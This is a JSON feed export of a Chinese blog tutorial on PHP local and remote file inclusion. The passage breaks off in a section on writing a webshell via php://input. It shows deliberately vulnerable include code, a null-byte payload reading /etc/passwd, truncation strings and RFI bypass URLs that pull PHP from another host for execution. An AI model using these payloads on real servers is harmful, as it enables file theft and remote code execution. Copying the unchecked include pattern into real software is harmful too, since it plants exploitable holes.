{
    "version": "https://jsonfeed.org/version/1",
    "title": "Or0kit • All posts by \"文件包含\" tag",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Or0kit.github.io",
    "items": [
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "web漏洞-文件包含",
            "date_published": "2021-01-20T04:12:47.000Z",
            "content_html": "<h1 id=\"文件包含漏洞简介\"><a class=\"anchor\" href=\"#文件包含漏洞简介\">#</a> 文件包含漏洞简介</h1>\n<ol>\n<li>\n<p>什么是文件包含漏洞？<br />\n程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p>\n</li>\n<li>\n<p>文件包含漏洞的成因<br />\n随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为<ins class=\"primary\">变量</ins>，用来进行动态调用，用户可以对<ins class=\"primary\">变量的值可控</ins>而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在 PHP 语言中。</p>\n<ul>\n<li>php 中常见包含文件的函数\n<ul>\n<li>include () 当使用该函数包含文件时，只有代码执行到 include () 函数时才将文件包含进来，发生错误时之给出一个警告，继续<ins class=\"primary\">向下执行</ins>。</li>\n<li>include_once () 功能与 Include () 相同，区别在于当重复调用同一文件时，<ins class=\"primary\">程序只调用一次</ins></li>\n<li>require () require () 与 include () 的区别在于 require () 执行如果发生错误，函数会输出错误信息，并<ins class=\"primary\">终止脚本的运行</ins>。</li>\n<li>require_once () 功能与 require () 相同，区别在于当重复调用同一文件时，<ins class=\"primary\">程序只调用一次</ins></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>文件包含漏洞的分类</p>\n<p>文件包含漏洞可以分为 RFI (远程文件包含) 和 LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是 php.ini 中是否开启了 allow_url_include。如果开启 了我们就有可能包含远程文件。</p>\n<p>1、本地文件包含 LFI (Local File Include)</p>\n<p>2、远程文件包含 RFI (Remote File Include)（需要 php.ini 中 allow_url_include=on、allow_url_fopen = On）</p>\n<p>在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。</p>\n</li>\n<li>\n<p>文件包含漏洞的危害</p>\n<ul>\n<li>配合文件上传漏洞 GetShell</li>\n<li>可以执行任意脚本代码</li>\n<li>网站源码文件以及配置文件泄露</li>\n<li>远程包含 GetShell</li>\n<li>控制整个网站甚至是服务器</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"常见漏洞环境\"><a class=\"anchor\" href=\"#常见漏洞环境\">#</a> 常见漏洞环境</h1>\n<p>了解这些主要是为了绕过</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>示例</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./action/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'./action/show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'./action/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span>page<span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'./action/show.php'</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h1 id=\"本地文件包含\"><a class=\"anchor\" href=\"#本地文件包含\">#</a> 本地文件包含</h1>\n<h2 id=\"无限制本地文件包含\"><a class=\"anchor\" href=\"#无限制本地文件包含\">#</a> 无限制本地文件包含</h2>\n<p>这种直接找我们到需要的文件路径，进行包含就行。</p>\n<p><span class=\"label\">示例</span></p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"有限制本地文件包含\"><a class=\"anchor\" href=\"#有限制本地文件包含\">#</a> 有限制本地文件包含</h2>\n<p>这种类型需要我们找到的敏感文件路径，然后<ins class=\"info\">绕过限制</ins>进行包含就行。</p>\n<h3 id=\"00截断\"><a class=\"anchor\" href=\"#00截断\">#</a> %00 截断</h3>\n<p>条件：magic_quotes_gpc = Off php 版本 &lt; 5.3.4</p>\n<p>在上面常见环境代码的后两种都得用 %00 截断</p>\n<p><span class=\"label warning\">示例</span><br />\n <code>http://www.xxx.com/xx.php?filename=../../etc/passwd%00</code></p>\n<h3 id=\"路径长度截断\"><a class=\"anchor\" href=\"#路径长度截断\">#</a> 路径长度截断</h3>\n<p>条件：windows OS，点号需要长于 256；linux OS 长于 4096</p>\n<p>Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；</p>\n<p>Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$filename</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"tab\" data-id=\"id1\" data-title=\"EXP:\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dC8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8=\">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txtspan></p>\n</div>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<h3 id=\"点号截断\"><a class=\"anchor\" href=\"#点号截断\">#</a> 点号截断</h3>\n<p>条件：windows OS，点号需要长于 256</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$filename</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"tab\" data-id=\"id2\" data-title=\"EXP:\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dA==\">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt</span>.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</p>\n</div>\n<h1 id=\"远程文件包含\"><a class=\"anchor\" href=\"#远程文件包含\">#</a> 远程文件包含</h1>\n<p>PHP 的配置文件 allow_url_fopen 和 allow_url_include 设置为 ON，include/require 等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>\n<div class=\"note info\">\n<p>allow_url_fopen = On（是否允许打开远程文件）<br />\nallow_url_include = On（是否允许 include/require 远程文件）</p>\n</div>\n<h2 id=\"无限制远程文件包含\"><a class=\"anchor\" href=\"#无限制远程文件包含\">#</a> 无限制远程文件包含</h2>\n<p>和无限制本地文件包含差不多。不再介绍（懒蛋。。）<br />\n<img data-src=\"image009.png\" alt=\"\" /></p>\n<h2 id=\"有限制远程文件包含\"><a class=\"anchor\" href=\"#有限制远程文件包含\">#</a> 有限制远程文件包含</h2>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>代码中多添加了 html 后缀，导致远程包含的文件也会多一个 html 后缀。</p>\n<h3 id=\"绕过姿势\"><a class=\"anchor\" href=\"#绕过姿势\">#</a> 绕过姿势</h3>\n<ol>\n<li>\n<p>问号绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt?</code> <br />\n<img data-src=\"image012.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>#号绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%23</code> <br />\n<img data-src=\"image011.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>空格 (%20) 绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%20</code> <br />\n<img data-src=\"image010.png\" alt=\"\" /></p>\n</li>\n</ol>\n<h1 id=\"php伪协议\"><a class=\"anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h1>\n<p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen ()、 copy ()、 file_exists () 和 filesize () 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register () 来注册自定义的封装协议。</p>\n<p>支持的种类有这 12 种</p>\n<ul>\n<li>file:// — 访问本地文件系统</li>\n<li>http:// — 访问 HTTP (s) 网址</li>\n<li>ftp:// — 访问 FTP (s) URLs</li>\n<li>php:// — 访问各个输入 / 输出流（I/O streams）</li>\n<li>zlib:// — 压缩流</li>\n<li>data:// — 数据（RFC 2397）</li>\n<li>glob:// — 查找匹配的文件路径模式</li>\n<li>phar:// — PHP 归档</li>\n<li>ssh2:// — Secure Shell 2</li>\n<li>rar:// — RAR</li>\n<li>ogg:// — 音频流</li>\n<li>expect:// — 处理交互式的流</li>\n</ul>\n<h2 id=\"php-输入输出流\"><a class=\"anchor\" href=\"#php-输入输出流\">#</a> php:// 输入输出流</h2>\n<p>PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>\n<h2 id=\"phpstdin-phpstdout-和-phpstderr\"><a class=\"anchor\" href=\"#phpstdin-phpstdout-和-phpstderr\">#</a> php://stdin, php://stdout 和 php://stderr</h2>\n<p>php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 STDIN 并不受影响。 推荐简单使用常量 STDIN、 STDOUT 和 STDERR 来代替手工打开这些封装器。</p>\n<p><span class=\"label warning\">php://stdin 是只读的，php://stdout 和 php://stderr 是只写的。</span></p>\n<p><span class=\"label success\">📣举例</span></p>\n<ol>\n<li><span class=\"label info\">php://stdin</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://stdin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//open our file pointer to read from stdin</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$line</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 读取</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image018.png\" alt=\"\" /></p>\n<p>可以看到打开了一个文件指针进行读取</p>\n<ol start=\"2\">\n<li><span class=\"label info\">php://stdout</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$fd</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://stdout'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$fd</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"这是一个测试\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image019.png\" alt=\"\" /><br />\n可以看到打开了一个文件指针进行写入</p>\n<ol start=\"3\">\n<li><span class=\"label info\">php://stderr</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$stderr</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'php://stderr'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$stderr</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"lalala\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stderr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image020.png\" alt=\"\" /></p>\n<p>可以看到打开了一个文件指针进行写入</p>\n<h2 id=\"phpinput\"><a class=\"anchor\" href=\"#phpinput\">#</a> php://input</h2>\n<p>php://input 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 php.ini 指令。<br />\n<span class=\"label warning\">注：enctype=”multipart/form-data” 的时候 php://input 是无效的。</span></p>\n<h3 id=\"phpinput-读取post数据\"><a class=\"anchor\" href=\"#phpinput-读取post数据\">#</a> php://input （读取 POST 数据）</h3>\n<p>碰到 file_get_contents () 就要想到用 php://input 绕过，因为 php 伪协议也是可以利用 http 协议的，即可以使用 POST 方式传数据，具体函数意义下一项；</p>\n<p>测试代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># 1.php文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>访问 <code>http://192.168.199.130/1.php</code> burp 抓包，添加 post 数据。</p>\n<p><span class=\"label\">结果</span></p>\n<p><img data-src=\"image021.png\" alt=\"\" /></p>\n<h3 id=\"phpinput写马\"><a class=\"anchor\" href=\"#phpinput写马\">#</a> php://input 写马</h3>\n<p>测试代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>条件：<ins>php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）</ins>, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 